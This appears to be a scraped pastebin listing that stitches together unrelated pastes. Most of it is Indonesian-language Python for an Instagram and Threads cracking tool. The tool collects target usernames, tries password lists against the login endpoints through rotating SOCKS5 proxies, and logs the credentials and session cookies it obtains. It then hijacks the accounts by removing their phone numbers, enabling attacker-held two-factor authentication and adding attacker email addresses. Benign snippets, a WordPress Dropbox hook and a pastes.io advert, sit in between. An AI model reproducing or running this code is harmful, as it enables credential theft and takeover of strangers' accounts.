                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
        "
JHutPr7q,Display Upload Folder Links - Dropbox,CodeDropz,PHP,Friday 8th of March 2024 12:47:55 AM CDT,"add_action('wpcf7_before_send_mail', function( $wpcf7 ){
	if( WPCF7_Submission::get_instance() ){
		$mail = $wpcf7->prop('mail');
		$fields = $wpcf7->scan_form_tags( array( 'type' => array('mfile', 'mfile*') ) );
		$folder = '';
		if( $uploader = wp_list_pluck( $fields, 'name' ) ){
			foreach( $uploader as $upload ){
				if( isset( $_POST[ $upload ] ) ){
					$folder = 'https://www.dropbox.com/home' . dirname( $_POST[ $upload ][0] );
					break;
				}
			}
		}

		if( $folder ){
			$mail['body'] = str_replace('[your-name__folder]', $folder, $mail['body'] );
		}

		$wpcf7->set_properties( array(""mail"" => $mail) );
	}
	return $wpcf7;
}, 10, 1);"
vQ17THN0,Pastes.io [Pastebin Alternative],xxsa,PHP,Friday 8th of March 2024 12:29:06 AM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

More features example share pages QR CODEs - Embed options .. etc
Simple Ads by Google Adsense ( Few rather than Pastebin )
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Ace Editor / Code Mirror
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Report explicit pastes
Socialite (Facebook/Twitter/Google Social login)
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
Auto generated sitemaps
User management
Admin panel to manage pastes, syntax, users, comments, pages, languages, translations & other settings
User profile page
Trending pastes page (day, week, month, year)
QR Code for share
No Captcha for logged in users feature
"
N2bLdc7G,Mad,Unknown_No_1,PHP,Friday 8th of March 2024 12:27:05 AM CDT,CheatByMadGamerTG
NdwF4b4k,140.213.57.19-/sdcard/instagram.py.py,OBF-XIn,Python,Friday 8th of March 2024 12:19:22 AM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from asset.enc_password import Requre
from asset.amankan_data import Require
from asset.useragent import Useragent
from asset.asset2.facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Menu Instagram) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
